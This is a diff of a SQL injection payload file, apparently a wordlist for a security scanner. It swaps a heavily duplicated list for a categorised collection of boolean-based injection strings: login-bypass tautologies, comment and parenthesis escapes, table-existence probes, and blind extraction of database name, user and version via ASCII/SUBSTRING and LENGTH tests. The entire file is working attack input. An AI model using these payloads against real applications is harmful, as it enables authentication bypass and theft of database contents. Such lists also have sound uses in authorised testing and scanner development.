@@ -1,300 +1,172 @@
-' AND '1'='1
-' AND '1'='2
+# ================================================
+# BOOLEAN-BASED SQL INJECTION PAYLOADS
+# Comprehensive collection for various databases
+# ================================================
+
+# Basic true/false conditions - Single quotes
 ' OR '1'='1
 ' OR '1'='2
-' AND 1=1
-' AND 1=2
-' OR 1=1
-' OR 1=2
-' AND (SELECT COUNT(*) FROM users)>0
-' AND (SELECT COUNT(*) FROM information_schema.tables)>10
-' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1
-' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65
-' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90
-' AND (SELECT 1 FROM dual) IS NOT NULL
-' AND EXISTS(SELECT 1 FROM users WHERE username='admin')
 ' AND '1'='1
 ' AND '1'='2
-' OR '1'='1
-' OR '1'='2
-' AND 1=1
-' AND 1=2
+' OR 'a'='a
+' OR 'a'='b
+' AND 'a'='a
+' AND 'a'='b
+
+# Basic true/false conditions - Numeric
 ' OR 1=1
 ' OR 1=2
-' AND (SELECT COUNT(*) FROM users)>0
-' AND (SELECT COUNT(*) FROM information_schema.tables)>10
-' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1
-' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65
-' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90
-' AND (SELECT 1 FROM dual) IS NOT NULL
-' AND EXISTS(SELECT 1 FROM users WHERE username='admin')
-' AND '1'='1
-' AND '1'='2
-' OR '1'='1
-' OR '1'='2
 ' AND 1=1
 ' AND 1=2
-' OR 1=1
-' OR 1=2
-' AND (SELECT COUNT(*) FROM users)>0
-' AND (SELECT COUNT(*) FROM information_schema.tables)>10
-' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1
-' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65
-' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90
-' AND (SELECT 1 FROM dual) IS NOT NULL
-' AND EXISTS(SELECT 1 FROM users WHERE username='admin')
-' AND '1'='1
-' AND '1'='2
-' OR '1'='1
-' OR '1'='2
-' AND 1=1
-' AND 1=2
-' OR 1=1
-' OR 1=2
-' AND (SELECT COUNT(*) FROM users)>0
-' AND (SELECT COUNT(*) FROM information_schema.tables)>10
-' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1
-' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65
-' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90
-' AND (SELECT 1 FROM dual) IS NOT NULL
-' AND EXISTS(SELECT 1 FROM users WHERE username='admin')
-' AND '1'='1
-' AND '1'='2
-' OR '1'='1
-' OR '1'='2
-' AND 1=1
-' AND 1=2
-' OR 1=1
-' OR 1=2
-' AND (SELECT COUNT(*) FROM users)>0
-' AND (SELECT COUNT(*) FROM information_schema.tables)>10
-' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1
-' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65
-' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90
-' AND (SELECT 1 FROM dual) IS NOT NULL
-' AND EXISTS(SELECT 1 FROM users WHERE username='admin')
-' AND '1'='1
-' AND '1'='2
-' OR '1'='1
-' OR '1'='2
-' AND 1=1
-' AND 1=2
-' OR 1=1
-' OR 1=2
-' AND (SELECT COUNT(*) FROM users)>0
-' AND (SELECT COUNT(*) FROM information_schema.tables)>10
-' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1
-' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65
-' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90
-' AND (SELECT 1 FROM dual) IS NOT NULL
-' AND EXISTS(SELECT 1 FROM users WHERE username='admin')
-' AND '1'='1
-' AND '1'='2
-' OR '1'='1
-' OR '1'='2
-' AND 1=1
-' AND 1=2
-' OR 1=1
-' OR 1=2
-' AND (SELECT COUNT(*) FROM users)>0
-' AND (SELECT COUNT(*) FROM information_schema.tables)>10
-' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1
-' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65
-' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90
-' AND (SELECT 1 FROM dual) IS NOT NULL
-' AND EXISTS(SELECT 1 FROM users WHERE username='admin')
-' AND '1'='1
-' AND '1'='2
-' OR '1'='1
-' OR '1'='2
-' AND 1=1
-' AND 1=2
-' OR 1=1
-' OR 1=2
-' AND (SELECT COUNT(*) FROM users)>0
-' AND (SELECT COUNT(*) FROM information_schema.tables)>10
-' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1
-' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65
-' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90
-' AND (SELECT 1 FROM dual) IS NOT NULL
-' AND EXISTS(SELECT 1 FROM users WHERE username='admin')
-' AND '1'='1
-' AND '1'='2
-' OR '1'='1
-' OR '1'='2
-' AND 1=1
-' AND 1=2
-' OR 1=1
-' OR 1=2
-' AND (SELECT COUNT(*) FROM users)>0
-' AND (SELECT COUNT(*) FROM information_schema.tables)>10
-' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1
-' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65
-' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90
-' AND (SELECT 1 FROM dual) IS NOT NULL
-' AND EXISTS(SELECT 1 FROM users WHERE username='admin')
-' AND '1'='1
-' AND '1'='2
-' OR '1'='1
-' OR '1'='2
-' AND 1=1
-' AND 1=2
-' OR 1=1
-' OR 1=2
-' AND (SELECT COUNT(*) FROM users)>0
-' AND (SELECT COUNT(*) FROM information_schema.tables)>10
-' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1
-' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65
-' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90
-' AND (SELECT 1 FROM dual) IS NOT NULL
-' AND EXISTS(SELECT 1 FROM users WHERE username='admin')
-' AND '1'='1
-' AND '1'='2
-' OR '1'='1
-' OR '1'='2
-' AND 1=1
-' AND 1=2
-' OR 1=1
-' OR 1=2
-' AND (SELECT COUNT(*) FROM users)>0
-' AND (SELECT COUNT(*) FROM information_schema.tables)>10
-' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1
-' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65
-' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90
-' AND (SELECT 1 FROM dual) IS NOT NULL
-' AND EXISTS(SELECT 1 FROM users WHERE username='admin')
-' AND '1'='1
-' AND '1'='2
-' OR '1'='1
-' OR '1'='2
-' AND 1=1
-' AND 1=2
-' OR 1=1
-' OR 1=2
-' AND (SELECT COUNT(*) FROM users)>0
-' AND (SELECT COUNT(*) FROM information_schema.tables)>10
-' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1
-' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65
-' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90
-' AND (SELECT 1 FROM dual) IS NOT NULL
-' AND EXISTS(SELECT 1 FROM users WHERE username='admin')
-' AND '1'='1
-' AND '1'='2
-' OR '1'='1
-' OR '1'='2
-' AND 1=1
-' AND 1=2
-' OR 1=1
-' OR 1=2
-' AND (SELECT COUNT(*) FROM users)>0
-' AND (SELECT COUNT(*) FROM information_schema.tables)>10
-' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1
-' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65
-' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90
-' AND (SELECT 1 FROM dual) IS NOT NULL
-' AND EXISTS(SELECT 1 FROM users WHERE username='admin')
-' AND '1'='1
-' AND '1'='2
-' OR '1'='1
-' OR '1'='2
-' AND 1=1
-' AND 1=2
-' OR 1=1
-' OR 1=2
-' AND (SELECT COUNT(*) FROM users)>0
-' AND (SELECT COUNT(*) FROM information_schema.tables)>10
-' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1
-' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65
-' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90
-' AND (SELECT 1 FROM dual) IS NOT NULL
-' AND EXISTS(SELECT 1 FROM users WHERE username='admin')
-' AND '1'='1
-' AND '1'='2
-' OR '1'='1
-' OR '1'='2
-' AND 1=1
-' AND 1=2
-' OR 1=1
-' OR 1=2
-' AND (SELECT COUNT(*) FROM users)>0
-' AND (SELECT COUNT(*) FROM information_schema.tables)>10
-' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1
-' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65
-' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90
-' AND (SELECT 1 FROM dual) IS NOT NULL
-' AND EXISTS(SELECT 1 FROM users WHERE username='admin')
-' AND '1'='1
-' AND '1'='2
-' OR '1'='1
-' OR '1'='2
-' AND 1=1
-' AND 1=2
-' OR 1=1
-' OR 1=2
-' AND (SELECT COUNT(*) FROM users)>0
-' AND (SELECT COUNT(*) FROM information_schema.tables)>10
-' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1
-' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65
-' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90
-' AND (SELECT 1 FROM dual) IS NOT NULL
-' AND EXISTS(SELECT 1 FROM users WHERE username='admin')
-' AND '1'='1
-' AND '1'='2
-' OR '1'='1
-' OR '1'='2
-' AND 1=1
-' AND 1=2
-' OR 1=1
-' OR 1=2
-' AND (SELECT COUNT(*) FROM users)>0
-' AND (SELECT COUNT(*) FROM information_schema.tables)>10
-' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1
-' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65
-' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90
-' AND (SELECT 1 FROM dual) IS NOT NULL
-' AND EXISTS(SELECT 1 FROM users WHERE username='admin')
-' AND '1'='1
-' AND '1'='2
-' OR '1'='1
-' OR '1'='2
-' AND 1=1
-' AND 1=2
-' OR 1=1
-' OR 1=2
-' AND (SELECT COUNT(*) FROM users)>0
-' AND (SELECT COUNT(*) FROM information_schema.tables)>10
-' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1
-' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65
-' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90
-' AND (SELECT 1 FROM dual) IS NOT NULL
-' AND EXISTS(SELECT 1 FROM users WHERE username='admin')
-' AND '1'='1
-' AND '1'='2
-' OR '1'='1
-' OR '1'='2
-' AND 1=1
-' AND 1=2
-' OR 1=1
-' OR 1=2
-' AND (SELECT COUNT(*) FROM users)>0
-' AND (SELECT COUNT(*) FROM information_schema.tables)>10
-' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1
-' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65
-' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90
-' AND (SELECT 1 FROM dual) IS NOT NULL
-' AND EXISTS(SELECT 1 FROM users WHERE username='admin')
-' AND '1'='1
-' AND '1'='2
-' OR '1'='1
-' OR '1'='2
-' AND 1=1
-' AND 1=2
-' OR 1=1
-' OR 1=2
-' AND (SELECT COUNT(*) FROM users)>0
-' AND (SELECT COUNT(*) FROM information_schema.tables)>10
-' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1
-' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65
-' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90
-' AND (SELECT 1 FROM dual) IS NOT NULL
-' AND EXISTS(SELECT 1 FROM users WHERE username='admin')
+' OR 2>1
+' OR 1>2
+' AND 2>1
+' AND 1>2
+
+# Prefixed with value - Single quotes
+1' OR '1'='1
+1' OR '1'='2
+1' AND '1'='1
+1' AND '1'='2
+admin' OR '1'='1
+admin' OR '1'='2
+
+# Prefixed with value - Numeric
+1' OR 1=1
+1' OR 1=2
+1' AND 1=1
+1' AND 1=2
+
+# With SQL comments --
+' OR 1=1--
+' OR 1=2--
+' AND 1=1--
+' AND 1=2--
+' OR '1'='1'--
+' OR '1'='2'--
+' AND '1'='1'--
+' AND '1'='2'--
+
+# With SQL comments #
+' OR 1=1#
+' OR 1=2#
+' AND 1=1#
+' AND 1=2#
+' OR '1'='1'#
+' OR '1'='2'#
+
+# With SQL comments /* */
+' OR 1=1/*
+' OR 1=2/*
+' AND 1=1/*
+' AND 1=2/*
+
+# Parenthesis variations
+') OR ('1'='1
+') OR ('1'='2
+') AND ('1'='1
+') AND ('1'='2
+')) OR (('1'='1
+')) OR (('1'='2
+
+# Double quote variations
+" OR "1"="1
+" OR "1"="2
+" AND "1"="1
+" AND "1"="2
+" OR 1=1--
+" OR 1=2--
+
+# Closing parenthesis with comments
+') OR 1=1--
+') OR 1=2--
+') AND 1=1--
+') AND 1=2--
+')) OR 1=1--
+')) OR 1=2--
+
+# Stacked conditions
+1' OR '1'='1' OR '1'='1
+1' OR '1'='2' OR '1'='1
+' OR username='admin' OR '1'='1
+' OR username='admin' OR '1'='2
+
+# Numeric without quotes
+1 OR 1=1
+1 OR 1=2
+1 AND 1=1
+1 AND 1=2
+-1 OR 1=1
+-1 OR 1=2
+
+# With LIMIT (MySQL)
+' OR 1=1 LIMIT 1--
+' OR 1=2 LIMIT 1--
+' OR '1'='1' LIMIT 1--
+
+# Subquery tests
+' OR (SELECT 1)=1--
+' OR (SELECT 1)=2--
+' AND (SELECT 1)=1--
+' AND (SELECT 1)=2--
+
+# Table/database existence tests
+' AND (SELECT COUNT(*) FROM users)>0--
+' AND (SELECT COUNT(*) FROM users)>999999--
+' AND (SELECT COUNT(*) FROM information_schema.tables)>10--
+' AND (SELECT COUNT(*) FROM information_schema.tables)>999999--
+' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1--
+' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>999--
+
+# EXISTS clause tests
+' AND EXISTS(SELECT 1 FROM users)--
+' AND EXISTS(SELECT 1 FROM admin)--
+' AND EXISTS(SELECT 1 FROM information_schema.tables)--
+' AND NOT EXISTS(SELECT 1 FROM nonexistent_table)--
+
+# ASCII/SUBSTRING tests for blind extraction
+' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65--
+' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90--
+' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) = 116--
+' AND ASCII(SUBSTRING((SELECT USER()), 1, 1)) > 100--
+' AND ASCII(SUBSTRING((SELECT VERSION()), 1, 1)) > 50--
+
+# LENGTH tests
+' AND LENGTH(DATABASE())>0--
+' AND LENGTH(DATABASE())>100--
+' AND LENGTH(USER())>5--
+' AND LENGTH(VERSION())>5--
+
+# LIKE operator tests
+' AND DATABASE() LIKE '%test%'--
+' AND USER() LIKE 'root%'--
+' AND VERSION() LIKE '5%'--
+
+# BETWEEN operator tests
+' AND 1 BETWEEN 0 AND 2--
+' AND 1 BETWEEN 3 AND 5--
+
+# Oracle specific
+' AND (SELECT 1 FROM dual) IS NOT NULL--
+' AND (SELECT 1 FROM dual) IS NULL--
+
+# CASE statement tests
+' AND CASE WHEN (1=1) THEN 1 ELSE 0 END--
+' AND CASE WHEN (1=2) THEN 1 ELSE 0 END--
+
+# Complex conditions
+' AND 1=1 AND '1'='1
+' AND 1=2 AND '1'='1
+' OR 1=1 OR '1'='2
+' OR 1=2 AND '1'='1
+
+# NULL tests
+' OR NULL IS NULL--
+' AND NULL IS NULL--
+' OR ISNULL(1)--
+
+# Additional variations
+'||'1'='1
+'||'1'='2
+'^(1=1)
+^(1=2)
